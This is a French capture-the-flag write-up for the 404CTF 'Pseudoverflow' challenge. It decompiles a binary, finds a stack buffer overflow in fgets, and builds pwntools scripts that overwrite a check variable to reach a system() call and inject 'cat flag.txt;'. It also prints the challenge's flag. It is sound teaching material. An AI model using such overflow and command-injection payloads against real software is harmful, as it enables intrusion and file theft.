# Pseudoverflow

## Sujet

```md
Course annuelle

Bienvenue à tous dans la course annuelle du 404CTF : les inscriptions sont ouvertes !! Votre pseudo sera-t-il à la hauteur de nos attentes ?

Objectif: lire le fichier flag.txt
 
Auteur: @Narcisse
```

# Analyse statique

À l'aide de Ghidra on obtient ces deux fonctions :

```C
undefined8 main(void)

{
  int iVar1;
  char local_78 [106];
  undefined4 local_e;
  undefined2 local_a;
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_e = 0x64726570;
  local_a = 0x73;
  puts(&DAT_00102008);
  fgets(local_78,0x100,stdin);
  iVar1 = strcmp((char *)&local_e,"gagne");
  if (iVar1 == 0) {
    win(local_78);
  }
  else {
    puts("Nous vous recontacterons dans les prochaines semaines.");
  }
  return 0;
}
```

```C
void win(char *param_1)

{
  system(param_1);
  return;
}
```

La fonction `fgets` dans main étant vulnérable à un buffer overflow, on va exploiter cette vulnérabilité pour modifier la variable `local_e` afin de passer la condition suivante et atteindre la fonction `win` :

```C
  iVar1 = strcmp((char *)&local_e,"gagne");
  if (iVar1 == 0) {
    win(local_78);
  }
```

Nous devrons ensuite utiliser l'appel system dans la fonctonion `win` pour ouvrir le fichier `flag.txt`.
Nous n'avons pas besoin d'analyse dynamique, passons directement à l'exploit.

# Analyse dynamique 

D'après l'analyse statique, la variable `local_78` utilisé en tant que buffer est de 106 bytes, et la variable `local_e` qui doit contenir `gagne` est stocké juste après dans la stack. Tentons de la modifier avec ce script :

```python
from pwn import *

offset = 106

payload = b"".join([
    b"\x41"*offset,
    b"gagne",
    b"\n",
])

p = process("./course")
input("Waiting for debugger...") # Pour ouvrir le process sous GDB
p.send(payload)
p.interactive()
```

```console
$ python3 exploit.py          
[+] Starting local process './course': pid 6204
Waiting for debugger...
[*] Switching to interactive mode
[*] Process './course' stopped with exit code 0 (pid 6204)
Bienvenue à la course annuelle du 404CTF!!
Pour pouvoir participer, nous avons besoin de votre pseudo :
Nous vous recontacterons dans les prochaines semaines.
[*] Got EOF while reading in interactive
$ 
```

Le code ne semble pas atteindre la fonction `win`. Allons voir sous GDB ce qu'il se passe :

```gdb
───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5621850ac22e <main+009a>      lea    rdx, [rip+0xe3c]        # 0x5621850ad071
   0x5621850ac235 <main+00a1>      mov    rsi, rdx
   0x5621850ac238 <main+00a4>      mov    rdi, rax
 → 0x5621850ac23b <main+00a7>      call   0x5621850ac060 <strcmp@plt>
   ↳  0x5621850ac060 <strcmp@plt+0000> jmp    QWORD PTR [rip+0x2fb2]        # 0x5621850af018 <strcmp@got.plt>
      0x5621850ac066 <strcmp@plt+0006> push   0x3
      0x5621850ac06b <strcmp@plt+000b> jmp    0x5621850ac020
      0x5621850ac070 <setvbuf@plt+0000> jmp    QWORD PTR [rip+0x2faa]        # 0x5621850af020 <setvbuf@got.plt>
      0x5621850ac076 <setvbuf@plt+0006> push   0x4
      0x5621850ac07b <setvbuf@plt+000b> jmp    0x5621850ac020
───────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
strcmp@plt (
   $rdi = 0x00007ffe9bb8445a → 0x00000a656e676167 ("gagne\n"?),
   $rsi = 0x00005621850ad071 → 0x4e0000656e676167 ("gagne"?),
   $rdx = 0x00005621850ad071 → 0x4e0000656e676167 ("gagne"?)
)
```

La variable `local_e` contient le charactère "\n". Rajoutons un null byte pour signaler la fin du string :

```python
from pwn import *

offset = 106

payload = b"".join([
    b"\x41"*offset,
    b"gagne\x00",
    b"\n",
])

p = process("./course")
input("Waiting for debugger...")
p.send(payload)
p.interactive()
```

```console
$ python3 exploit.py
[+] Starting local process './course': pid 6241
Waiting for debugger...
[*] Switching to interactive mode
Bienvenue à la course annuelle du 404CTF!!
Pour pouvoir participer, nous avons besoin de votre pseudo :
[*] Process './course' stopped with exit code 0 (pid 6241)
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgagne: not found
[*] Got EOF while reading in interactive
$
```

Nous exécutons effectivement du code : nous avons atteint la fonction `win`. Tentons de contrôler le code exécuté.
D'après l'analyse statique, la fonction `win` exécute le string passé en argument :

```C
void win(char *param_1)

{
  system(param_1);
```

Et la fonction main passe la variable `local_78` utilisé en tant que buffer est envoyé à la fonction `win` :

```C
win(local_78);
```

Injectons le code à exécuter dans la variable `local_78` :

```python
from pwn import *

offset = 106
cat = b"cat flag.txt;"

payload = b"".join([
    cat,
    b"\x00"*(offset-len(cat)),
    b"gagne\x00",
    b"\n",
])

p = process("./course")
input("Waiting for debugger...")
p.send(payload)
p.interactive()
```

```console
$ echo flagIsHere > flag.txt

$ python3 exploit.py
[+] Starting local process './course': pid 6342
Waiting for debugger...
[*] Switching to interactive mode
Bienvenue à la course annuelle du 404CTF!!
Pour pouvoir participer, nous avons besoin de votre pseudo :
flagIsHere
[*] Got EOF while reading in interactive
$ 
[*] Process './course' stopped with exit code 0 (pid 6342)
```

On a bien ouvert le fichier voulu. Essayons maintenant d'exploit le service mis en ligne.

# Exploit

Nous allons envoyer le payload avec [ce script](./exploit.py) :

```console
$ python3 exploit.py
[+] Opening connection to challenges.404ctf.fr on port 31958: Done
[*] Switching to interactive mode
Bienvenue à la course annuelle du 404CTF!!
Pour pouvoir participer, nous avons besoin de votre pseudo :
404CTF{0v3rfl0w}[*] Got EOF while reading in interactive
$ 
[*] Closed connection to challenges.404ctf.fr port 31958
```

On obtient bien le flag : `404CTF{0v3rfl0w}`.
